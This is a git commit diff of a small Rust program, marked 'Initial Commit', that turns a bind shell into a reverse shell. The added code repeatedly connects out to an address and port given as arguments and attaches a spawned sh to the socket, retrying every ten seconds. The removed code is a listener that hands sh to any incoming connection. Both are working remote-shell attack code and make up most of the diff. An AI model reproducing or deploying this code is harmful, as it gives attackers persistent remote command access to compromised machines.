4ffe189f569e8366e2ffce4eeb1e40e3783b3f02
Hayden Pope <stilbruch39@gmail.com>
2018-02-18 19:27:05 +0000

    Initial Commit

--- src/main.rs
+++ src/main.rs
@@ -1,19 +1,9 @@
 
-use std::net::{TcpListener, TcpStream};
-use std::thread;
+use std::net::TcpStream;
+use std::{thread, time};
 use std::env;
 use std::process::{Command, Stdio};
 use std::os::unix::io::{AsRawFd, FromRawFd};
-
-unsafe fn handle_client(stream: TcpStream) {
-
-    Command::new("sh")
-        .stdin(Stdio::from_raw_fd(stream.as_raw_fd()))
-        .stdout(Stdio::from_raw_fd(stream.as_raw_fd()))
-        .stderr(Stdio::from_raw_fd(stream.as_raw_fd()))
-        .spawn()
-        .expect("Could not create a shell");
-}
 
 fn main() {
 
@@ -22,11 +12,7 @@ fn main() {
     let mut address = String::new();
 
     match args.len() {
-        1 => {
-            eprintln!("Error: Not enough not args!");
-            return;
-        }
-        2 => {
+        1 | 2 => {
             eprintln!("Error: Not enough not args!");
             return;
         }
@@ -49,22 +35,19 @@ fn main() {
         return;
     }
 
-    let listener = match TcpListener::bind(format!("{}:{}", address, port)) {
-        Ok(l) => l,
-        Err(_) => {
-            eprintln!("Error: Could not bind to {}:{}", address, port);
-            return;
-        }
-    };
-
-    for connection in listener.incoming() {
-        match connection {
-            Ok(stream) => {
-                thread::spawn(|| unsafe {
-                    handle_client(stream);
-                });
-            }
+    loop {
+        match TcpStream::connect(format!("{}:{}", address, port)) {
+            Ok(stream) => unsafe {
+                let _ = Command::new("sh")
+                    .stdin(Stdio::from_raw_fd(stream.as_raw_fd()))
+                    .stdout(Stdio::from_raw_fd(stream.as_raw_fd()))
+                    .stderr(Stdio::from_raw_fd(stream.as_raw_fd()))
+                    .status()
+                    .expect("Could not create a shell");
+            },
             Err(_) => {}
-        }
+        };
+
+        thread::sleep(time::Duration::from_secs(10));
     }
 }
